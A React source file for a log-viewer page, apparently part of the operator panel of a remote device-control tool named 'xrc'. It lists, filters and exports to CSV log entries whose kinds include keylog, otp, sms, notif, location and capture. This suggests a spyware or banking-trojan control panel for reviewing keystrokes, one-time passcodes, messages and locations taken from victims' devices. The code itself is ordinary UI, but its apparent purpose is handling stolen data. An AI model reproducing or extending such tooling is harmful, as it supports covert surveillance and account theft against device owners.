import { useEffect, useState } from 'react';
import type { LogEntry } from '@xrc/shared';
import { useDeviceStore } from '@/stores/devices';

const KINDS = ['all', 'info', 'keylog', 'otp', 'sms', 'notif', 'location', 'capture', 'scan', 'status', 'error'];

export default function Logs() {
  const devices = useDeviceStore((s) => s.devices);
  const [kind, setKind] = useState('all');
  const [deviceId, setDeviceId] = useState('all');
  const [logs, setLogs] = useState<LogEntry[]>([]);

  useEffect(() => {
    void (async () => {
      try {
        const r = await fetch(`/api/logs?${new URLSearchParams({ limit: '500' })}`).then((x) => x.json());
        setLogs(r.data?.logs ?? []);
      } catch {
        setLogs([]);
      }
    })();
  }, [kind, deviceId]);

  const filtered = logs.filter((l) => (kind === 'all' || l.kind === kind) && (deviceId === 'all' || l.deviceId === deviceId));
  const kindCls: Record<string, string> = {
    keylog: 'text-sky-300', otp: 'text-amber-300', error: 'text-rose-300',
    location: 'text-emerald-300', capture: 'text-fuchsia-300', scan: 'text-cyan-300',
    status: 'text-amber-200', info: 'text-slate-400', sms: 'text-slate-300', notif: 'text-slate-300',
  };

  const exportCsv = () => {
    const rows = [['ts', 'device', 'kind', 'message'], ...filtered.map((l) => [new Date(l.ts).toISOString(), l.deviceId, l.kind, l.message])];
    const blob = new Blob([rows.map((r) => r.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n')], { type: 'text/csv' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = `xrc-logs-${Date.now()}.csv`;
    a.click();
  };

  return (
    <div className="space-y-4">
      <div className="flex flex-wrap items-center gap-2">
        <select value={kind} onChange={(e) => setKind(e.target.value)} className="rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 outline-none">
          {KINDS.map((k) => <option key={k} value={k}>{k}</option>)}
        </select>
        <select value={deviceId} onChange={(e) => setDeviceId(e.target.value)} className="rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 outline-none">
          <option value="all">all devices</option>
          {devices.map((d) => <option key={d.id} value={d.id}>{d.name}</option>)}
        </select>
        <button onClick={exportCsv} className="rounded-lg border border-slate-700 bg-slate-900 px-3 py-2 text-xs font-bold text-slate-300 hover:bg-slate-800">
          ⬇ CSV export
        </button>
        <span className="ml-auto text-xs text-slate-600 font-mono">{filtered.length} rows</span>
      </div>
      <div className="rounded-xl border border-slate-800 bg-surface p-3 h-[calc(100vh-220px)] overflow-y-auto">
        {filtered.length === 0 && <div className="text-slate-600 text-center py-12 text-sm">no log rows match</div>}
        {filtered.map((l, i) => (
          <div key={i} className="border-b border-slate-800/50 py-1.5 font-mono text-[11px] flex gap-3">
            <span className="text-slate-600 shrink-0">{new Date(l.ts).toLocaleString()}</span>
            <span className="text-slate-500 shrink-0">{l.deviceId.slice(0, 8)}</span>
            <span className={`shrink-0 w-16 ${kindCls[l.kind] ?? 'text-slate-400'}`}>{l.kind}</span>
            <span className="text-slate-300 break-all">{l.message}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
